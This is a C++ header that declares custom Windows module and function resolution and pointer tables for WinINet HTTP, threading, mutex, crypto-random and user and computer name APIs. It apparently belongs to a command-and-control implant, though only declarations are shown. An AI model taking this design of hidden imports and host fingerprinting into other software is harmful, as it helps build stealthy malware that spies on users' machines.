#pragma once

#define SECURITY_WIN32

#include <windows.h>
#include <wchar.h>
#include <winternl.h>
#include <wininet.h>
#include <Security.h>
#include "buffer.h"
#include "constants.h"

/* Helper methods */

HMODULE GetModuleHandleCustom(PCHAR moduleName);

PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName);

HMODULE LoadLibraryCustom(IN PCHAR moduleName);

DWORD FreeLibraryCustom(IN HMODULE hModule);

/* Structs to store pointers to Modules */
struct LoadedModules
{
    HMODULE hNtdll;
    HMODULE hKernel32;
    HMODULE hUser32;
    HMODULE hWininet;
    HMODULE hBcrypt;
    HMODULE hSecur32;
};

/* Struct to store pointers to Functions */
struct LoadedFunctions
{
    int (*MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
    HMODULE (*LoadLibraryA)(LPCSTR lpLibFileName);
    BOOL (*FreeLibrary)(HMODULE hLibModule);
    HINTERNET (*InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
    HINTERNET (*InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
    HINTERNET (*HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
    BOOL (*HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL (*InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
    BOOL (*InternetCloseHandle)(HINTERNET hInternet);
    BOOL (*InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    HANDLE (*GetProcessHeap)();
    LPVOID (*HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    LPVOID (*HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
    BOOL (*HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
    DWORD (*GetLastError)();
    NTSTATUS (*BCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
    NTSTATUS (*BCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
    NTSTATUS (*BCryptGenRandom)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
    HANDLE (*CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    HANDLE (*CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
    DWORD (*WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
    BOOL (*ReleaseMutex)(HANDLE hMutex);
    BOOL (*CloseHandle)(HANDLE hObject);
    HANDLE (*CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
    BOOL (*SetEvent)(HANDLE hEvent);
    BOOL (*ResetEvent)(HANDLE hEvent);
    BOOLEAN (*GetUserNameExA)(IN EXTENDED_NAME_FORMAT NameFormat, OUT LPSTR lpNameBuffer, IN OUT PULONG nSize);
    BOOL (*GetComputerNameExA)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize);
};

/* Class for WinAPI functions */
class WinApiCustom
{
public:
    /* Constructoe and destructor */

    WinApiCustom();
    ~WinApiCustom();

    /* Loaded modules and their functions */

    LoadedModules loadedModules;
    LoadedFunctions loadedFunctions;

    /* Wrapper methods */

    LPVOID HeapAllocCustom(DWORD sizeOfBufferToAllocate);
    BOOL HeapFreeCustom(LPVOID pBufferToFree);
    LPVOID HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes);
    HANDLE CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams);
    HANDLE CreateMutexCustom();
    LPVOID GetUserNameCustom();
    LPVOID GetFQDNComputer();
};
